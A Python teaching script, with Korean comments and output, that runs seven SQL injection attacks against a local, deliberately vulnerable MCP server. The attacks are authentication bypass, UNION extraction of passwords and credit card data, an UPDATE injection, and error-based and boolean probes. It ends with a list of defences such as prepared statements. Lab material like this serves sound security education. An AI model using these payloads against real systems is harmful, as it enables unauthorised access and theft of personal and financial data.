#!/usr/bin/env python3
"""
SQL Injection 공격 시뮬레이션

이 스크립트는 교육 목적으로 다양한 SQL Injection 공격 기법을 시연합니다.
실제 환경에서 무단으로 사용하면 법적 책임을 질 수 있습니다!
"""

import asyncio
import json
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

async def run_attack_simulation():
    """SQL Injection 공격 시뮬레이션 실행"""

    print("=" * 70)
    print("⚠️  SQL INJECTION 공격 시뮬레이션")
    print("=" * 70)
    print("⚠️  경고: 이 스크립트는 교육 목적으로만 사용하세요!")
    print("=" * 70)

    import os
    script_dir = os.path.dirname(os.path.abspath(__file__))

    server_params = StdioServerParameters(
        command="python3",
        args=[os.path.join(script_dir, "vulnerable_server.py")],
        env=None
    )

    async with stdio_client(server_params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()

            # 공격 1: 인증 우회 (Authentication Bypass)
            print("\n🎯 공격 1: 인증 우회 (Authentication Bypass)")
            print("-" * 70)
            print("📝 공격 기법: ' OR '1'='1")
            print("💡 원리: SQL 쿼리의 WHERE 조건을 항상 참으로 만듦")
            print()

            result = await session.call_tool("login", arguments={
                "username": "admin' OR '1'='1",
                "password": "anything"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

            # 공격 2: UNION 기반 데이터 추출
            print("\n🎯 공격 2: UNION SELECT - 전체 데이터 추출")
            print("-" * 70)
            print("📝 공격 기법: UNION SELECT")
            print("💡 원리: 추가 SELECT 문으로 다른 데이터 조회")
            print()

            result = await session.call_tool("search_user", arguments={
                "username": "' UNION SELECT id, username, password, credit_card FROM users--"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

            # 공격 3: 숫자 필드 SQL Injection
            print("\n🎯 공격 3: 숫자 필드를 통한 데이터 추출")
            print("-" * 70)
            print("📝 공격 기법: UNION SELECT with numeric field")
            print("💡 원리: 숫자 필드도 SQL Injection에 취약할 수 있음")
            print()

            result = await session.call_tool("get_user_info", arguments={
                "user_id": "1 UNION SELECT id, username, password, credit_card FROM users"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

            # 공격 4: 데이터 조작 (UPDATE Injection)
            print("\n🎯 공격 4: 데이터 조작 공격")
            print("-" * 70)
            print("📝 공격 기법: SQL Injection in UPDATE")
            print("💡 원리: UPDATE 문에서 추가 조건 삽입")
            print()

            result = await session.call_tool("update_email", arguments={
                "username": "alice",
                "new_email": "hacked@evil.com' WHERE '1'='1"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

            # 공격 결과 확인
            print("\n📊 공격 후 데이터베이스 상태 확인")
            print("-" * 70)
            result = await session.call_tool("search_user", arguments={
                "username": ""
            })
            print(f"현재 사용자 목록:\n{result.content[0].text}")

            # 공격 5: 정보 수집 (Error-based SQL Injection)
            print("\n🎯 공격 5: 에러 기반 정보 수집")
            print("-" * 70)
            print("📝 공격 기법: Error-based SQL Injection")
            print("💡 원리: 의도적으로 SQL 에러를 발생시켜 DB 구조 파악")
            print()

            result = await session.call_tool("login", arguments={
                "username": "admin'",
                "password": "test"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

            # 공격 6: 주석을 이용한 우회
            print("\n🎯 공격 6: SQL 주석을 이용한 우회")
            print("-" * 70)
            print("📝 공격 기법: SQL Comment (--)")
            print("💡 원리: -- 이후의 모든 내용을 주석 처리")
            print()

            result = await session.call_tool("login", arguments={
                "username": "admin'--",
                "password": "ignored"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

            # 공격 7: Blind SQL Injection 시뮬레이션
            print("\n🎯 공격 7: Blind SQL Injection (시간 기반)")
            print("-" * 70)
            print("📝 공격 기법: Time-based Blind SQL Injection")
            print("💡 원리: 응답 시간 차이로 정보 추출 (SQLite는 SLEEP 미지원)")
            print()

            result = await session.call_tool("search_user", arguments={
                "username": "' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)='1"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

    print("\n" + "=" * 70)
    print("⚠️  공격 시뮬레이션 완료")
    print("=" * 70)
    print()
    print("📋 공격 성공 요약:")
    print("  ✓ 인증 우회 성공 - 비밀번호 없이 로그인 가능")
    print("  ✓ 전체 데이터 추출 성공 - 사용자 비밀번호 및 신용카드 정보 탈취")
    print("  ✓ 데이터 조작 성공 - 모든 사용자의 이메일 변경")
    print("  ✓ DB 구조 정보 수집 성공")
    print()
    print("🛡️  방어 방법:")
    print("  1. Prepared Statements 사용")
    print("  2. 파라미터화된 쿼리 사용")
    print("  3. 입력값 검증 및 필터링")
    print("  4. 최소 권한 원칙 적용")
    print("  5. 에러 메시지 최소화")
    print("=" * 70)

if __name__ == "__main__":
    asyncio.run(run_attack_simulation())
